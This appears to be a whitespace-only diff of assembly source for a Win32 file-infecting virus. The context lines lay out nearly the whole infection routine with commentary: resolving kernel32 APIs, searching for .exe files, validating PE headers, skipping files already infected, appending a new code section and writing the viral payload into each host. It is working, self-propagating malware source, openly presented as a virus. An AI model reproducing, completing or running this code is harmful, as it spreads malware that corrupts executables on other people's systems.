@@ -13,8 +13,8 @@ include epjector.inc
 
 ; The Generation 0 infector needs a data section even though the
 ; virus code won't reference it. Without a data section I found
-; tasm/tlink will not properly setup the gen0 executable and 
-; crashes will ensue. 
+; tasm/tlink will not properly setup the gen0 executable and
+; crashes will ensue.
 ;
 ; TODO(@CPU): It would be nice to have a more satisfying answer
 ; for what tasm/tlink skips without this dummy section.
@@ -32,7 +32,7 @@ extern AddAtomA:PROC
 start:
 viral_payload:
 
-; Before anything else, compute the delta offset. This is the secret 
+; Before anything else, compute the delta offset. This is the secret
 ; to position independence.
 ;
 ; TODO(@CPU): Use a less vanilla method of delta offset calculation. This
@@ -53,13 +53,13 @@ viral_payload:
     mov [ebp + savedEntryPoint], eax
 
 ; First we need to find kernel32.dll's base address. We can take advantage
-; of the fact that the kernel calls the program entrypoint to do this. 
+; of the fact that the kernel calls the program entrypoint to do this.
 ; Since the kernel CreateProcess function called this program's entrypoint
 ; the return address on the top of the stack will be somewhere in kernel32.dll
 ; address space and we can search from there for the start of a PE header to get
 ; the base kernel32.dll address.
 @@findkernel32:
-  ; Put the top of the stack into esi. This is the return address for the 
+  ; Put the top of the stack into esi. This is the return address for the
   ; CreateProcess function call one frame above us.
   mov esi, dword ptr [esp]
   ; We know the DLL is section aligned so clear out the lower byte of ESI
@@ -90,7 +90,7 @@ viral_payload:
   ; The data directory virtual address is an offset so we need to add the
   ; kernel32 base address to it
   add ebx, eax
-            
+
   ; Zero the index counter
   xor edx, edx
 @@checkexportname:
@@ -124,19 +124,19 @@ viral_payload:
   jmp @@checkexportname
 
 
-; At this point esi points to a match for getProcAddrName 
+; At this point esi points to a match for getProcAddrName
 ; and edx is the byte offset into AddressOfNames that matched.
 ;
-; To map from the offset in AddressOfNames to the offset in 
+; To map from the offset in AddressOfNames to the offset in
 ; AddressOfNameOrdinals we need to do some quick math.
 ;
-; AddressOfNames entries are DWORDs while AddressOfNameOrdinals entries 
-; are WORDs so to convert the AddressOfNames offset to an 
+; AddressOfNames entries are DWORDs while AddressOfNameOrdinals entries
+; are WORDs so to convert the AddressOfNames offset to an
 ; AddressOfNameOrdinals offset we need to divide the offset by two.
 @@findordinal:
   ; A shift and rotate to the right by 1 is a cheap divide by 2.
   shr edx, 01h
-     
+
   ; Get the RVA for the AddressOfNameOrdinals array
   mov esi, (IMAGE_EXPORT_DIRECTORY [ebx]).AddressOfNameOrdinals
   ; Offset by the matching byte offset
@@ -151,10 +151,10 @@ viral_payload:
 ;
 ; To get an offset into AddressOfFunctions using the ordinal we need
 ; to multiply by the 4 because each AddressOfFunction entry is a DWORD.
-@@findfunc:   
+@@findfunc:
   ; A shift and rotate to the left by 2 is a cheap multiply by 4.
   shl edx, 02h
-    
+
   ; Get the RVA for the AddressOfFunctions array
   mov esi, (IMAGE_EXPORT_DIRECTORY [ebx]).AddressOfFunctions
   ; Offset by the matching byte offset
@@ -165,8 +165,8 @@ viral_payload:
   mov esi, [esi]
   ; Adjust by kernel32.dll base
   add esi, eax
-    
-  ; Woohoo. esi now finally holds the pointer to 
+
+  ; Woohoo. esi now finally holds the pointer to
   ; GetProcAddress in Kernel32.dll. Now we can bootstrap our win32
   ; APIs!
   mov [ebp + GetProcAddress], esi
@@ -174,7 +174,7 @@ viral_payload:
 ; With GetProcAddress in hand we can now "link" each of the REQUIRED_APIs
 ; This will populate the pointer variable for each function using GetProcAddress.
 ;
-; NOTE(@cpu): Each of these LINK_API's macro invocations have a related 
+; NOTE(@cpu): Each of these LINK_API's macro invocations have a related
 ;             DESC_RUNTIME_API and REQUIRED_API invocation.
 @@linkapis:
   LINK_API ExitProcess
@@ -197,7 +197,7 @@ findfirst:
 
   CALL_RUNTIME_API FindFirstFileA, <eax, ebx>
 
-  ; If we got an invalid handle from FindFirstFileA that means there were no EXEs 
+  ; If we got an invalid handle from FindFirstFileA that means there were no EXEs
   ; in the directory. Jump to error to handle this case
   cmp eax, INVALID_HANDLE_VALUE
   je @@nofirst
@@ -221,7 +221,7 @@ targetfound:
   ; If there was no error, map the target file.
   jmp mapfile
 
-; If we're here it means the targetFile wasn't any good. 
+; If we're here it means the targetFile wasn't any good.
 ; Time to look at the next available .exe file using FindNextFile
 findnext:
   mov eax, [ebp + findHandle]
@@ -234,10 +234,10 @@ findnext:
   ; to targetFound.
   jmp targetfound
 
-; Otherwise we didn't find any more .exe files to look at. 
+; Otherwise we didn't find any more .exe files to look at.
 ; Call the original OEP or exit.
 @@nonext:
-  CALL_OEP  
+  CALL_OEP
 
 ; We found a targetfile and need to map it to examine whether its a good PE file.
 mapfile:
@@ -251,7 +251,7 @@ mapfile:
   cmp eax, INVALID_HANDLE_VALUE
   je findnext
   mov [ebp + targetFileHandle], eax
- 
+
   ; Get the target file's original size
   CALL_RUNTIME_API GetFileSize, <eax, 0>
   cmp eax, INVALID_HANDLE_VALUE
@@ -261,7 +261,7 @@ mapfile:
   ; The target file should at least be big enough for a full IMAGE_DOS_HEADER
   cmp eax, size IMAGE_DOS_HEADER
   jle error
-   
+
   ; Create a read/write file mapping for the entire targetFile
   ; TODO(@cpu): I could probably be more surgical here and only map the
   ;             area of the PE file that is manipulated on the first pass.
@@ -288,7 +288,7 @@ mapfile:
   ; IMAGE_NT_HEADERS
   add eax, (IMAGE_DOS_HEADER [eax]).e_lfanew
 
-  ; Check that the offset specifed by e_lfanew isn't out of bounds for the 
+  ; Check that the offset specifed by e_lfanew isn't out of bounds for the
   ; file size
   mov ecx, eax
   sub ecx, [ebp + targetP]
@@ -299,7 +299,7 @@ mapfile:
   add ecx, size IMAGE_NT_HEADERS
   cmp ecx, [ebp + targetFileSize]
   jge findnext
-   
+
 @@checkpeheader:
   ; Check that we have a PE header by looking for the right magic
   ; bytes (PE) at the expected offset
@@ -307,7 +307,7 @@ mapfile:
   jnz findnext
 
 @@checksubsystem:
-  ; We only want to infect GUI or Console apps, not device drivers, 
+  ; We only want to infect GUI or Console apps, not device drivers,
   ; WinCE apps, etc
   cmp (IMAGE_NT_HEADERS [eax]).OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_GUI
   jz @@checkmachine
@@ -317,7 +317,7 @@ mapfile:
 @@checkmachine:
   ; We need to verify the PE is targetting a i386 machine.
   cmp (IMAGE_NT_HEADERS [eax]).FileHeader.Machine, IMAGE_FILE_MACHINE_I386
-  jnz findnext   
+  jnz findnext
 
 ; At this point we've decided we have found a valid i386 PE and we can
 ; analyze it for infection.
@@ -338,7 +338,7 @@ mapfile:
   cmp ecx, 0h
   je findnext
   mov [ebp + numberOfSections], ecx
-   
+
   ; Move ahead to the section table
   add eax, size IMAGE_NT_HEADERS
 
@@ -375,28 +375,28 @@ mapfile:
   ; Store the location of the last segment header
   mov [ebp + lastSegHeader], ecx
 
-; We don't want to reinfect a file. Check if the last segment's name is 
+; We don't want to reinfect a file. Check if the last segment's name is
 ; equal to newSegName. If it is, move on.
-@@checkforinfection:    
+@@checkforinfection:
   ; Save register state so if this check passes we can easily restore
   pusha
     ; Compare the last segment's name with the newSegName
     mov esi, ecx
-    mov edi, offset newSegName   
+    mov edi, offset newSegName
     add edi, ebp
     mov ecx, newSegNameEnd - newSegName
     repz cmpsb
-    ; If it is equal, then we've already infected this file. 
+    ; If it is equal, then we've already infected this file.
     ; Find a different one
     jz findnext
   popa
- 
+
   ; Check there is room for a new seg header. We can tell if there's no
   ; room if the end of the IMAGE_SECTION_HEADER is larger than the first section's
-  ; pointer to raw data. 
+  ; pointer to raw data.
   ; TODO(@CPU): The above is only true most of the time... A better idea (more work...)
-  ; would be to search all of the section header's for the one with the lowest 
-  ; PointerToRawData and check against it. Ignoring for now because this is super 
+  ; would be to search all of the section header's for the one with the lowest
+  ; PointerToRawData and check against it. Ignoring for now because this is super
   ; corner-casey and I'm a bit lazy!
   mov ebx, [ebp + lastSegHeader]
   add ebx, size IMAGE_SECTION_HEADER
@@ -404,7 +404,7 @@ mapfile:
   mov edx, (IMAGE_SECTION_HEADER [edx]).PointerToRawData
   add edx, [ebp + targetP]
   cmp ebx, edx
-  jge findnext  
+  jge findnext
 
 ; Create a new section header for our injected section by copying
 ; the target's first section header and then fixing it up.
@@ -412,7 +412,7 @@ mapfile:
   mov ecx, size IMAGE_SECTION_HEADER ; Size   = 1 header worth
   mov edi, [ebp + lastSegHeader]     ; DEST   = ECX = Last header start
   add edi, ecx                       ; DEST   = Last header end
-  mov esi, [ebp + segHeaders]        ; Source = First segment header 
+  mov esi, [ebp + segHeaders]        ; Source = First segment header
   mov ebx, edi
 @@copyheader:
   lodsb
@@ -424,14 +424,14 @@ mapfile:
 @@fixupheader:
   ; Move back to the beginning of the new header
   sub edi, size IMAGE_SECTION_HEADER
-    
+
   ; Fix the segment name by writing newSegName on top of the old name
   mov eax, offset newSegName
   add eax, ebp
   CALL_RUNTIME_API lstrcpy, <edi, eax>
   cmp eax, 0h
   je findnext
-    
+
   ; Fix the VirtualSize, ensuring its a multiple of the section alignment
   mov eax, viral_payload_size
   sub eax, 1
@@ -452,7 +452,7 @@ mapfile:
   add eax, 1
   mul [ebp + sectionAlignment]
   mov [edi].SecHdrVirtualAddress, eax
-     
+
   ; Temporarily move back to the start of the PE file to fix a few things
   mov ecx, [ebp + targetP]
   add ecx, (IMAGE_DOS_HEADER [ecx]).e_lfanew
@@ -465,7 +465,7 @@ mapfile:
   inc eax
   ; Set the number of sections to the new number
   mov (IMAGE_NT_HEADERS [ecx]).FileHeader.NumberOfSections, ax
-  
+
   ; Fix the raw data size, ensuring it is a multiple of the file alignment
   mov eax, viral_payload_size
   sub eax, 1
@@ -483,7 +483,7 @@ mapfile:
   mov eax, (IMAGE_SECTION_HEADER [ebx]).PointerToRawData
   add eax, (IMAGE_SECTION_HEADER [ebx]).SizeOfRawData
   mov (IMAGE_SECTION_HEADER [edi]).PointerToRawData, eax
-   
+
   ; Save the pointer to raw data and the size of the raw data
   mov eax, (IMAGE_SECTION_HEADER [edi]).PointerToRawData
   mov [ebp + injectStart], eax
@@ -497,7 +497,7 @@ mapfile:
            IMAGE_SCN_CNT_CODE
   mov (IMAGE_SECTION_HEADER [edi]).SecHdrCharacteristics, ecx
 
-; We've added a section header to the file. Time to unmap & remap with an inflated 
+; We've added a section header to the file. Time to unmap & remap with an inflated
 ; size big enough to fit the new section contents.
 @@cleanup:
   ; Unmap the target
@@ -511,11 +511,11 @@ mapfile:
   CALL_RUNTIME_API CloseHandle, <eax>
   cmp eax, 0h
   je error
-  
+
   ; NOTE(@CPU): We don't close the target file handlehere because we can reuse it
   ; for the remap operation.
 
-  ; Calculate the new size we should map. This is the old target size + 
+  ; Calculate the new size we should map. This is the old target size +
   ; the size of the new section on-disk
   mov eax, [ebp + targetFileSize]
   mov ecx, [ebp + injectSize]
@@ -536,7 +536,7 @@ mapfile:
   mov [ebp + targetP], eax
 
   ; zero the new segment area we'll write - this makes debugging much easier
-  ; and ensures we don't put random bits of the host's memory into each new 
+  ; and ensures we don't put random bits of the host's memory into each new
   ; infection.
   pusha
     mov edi, eax
@@ -545,7 +545,7 @@ mapfile:
     @@loopcopy:
       mov eax, 0h
       stosb
-    loop @@loopcopy      
+    loop @@loopcopy
   popa
 
 ; Time to write the new section content with our own code
@@ -583,7 +583,7 @@ mapfile:
   je error
 
 ; Woohoo. The file is now infected with a new segment containing our virus. Nice!
-@@finishedinfection:   
+@@finishedinfection:
   ; Move on to other targets
   jmp findnext
 
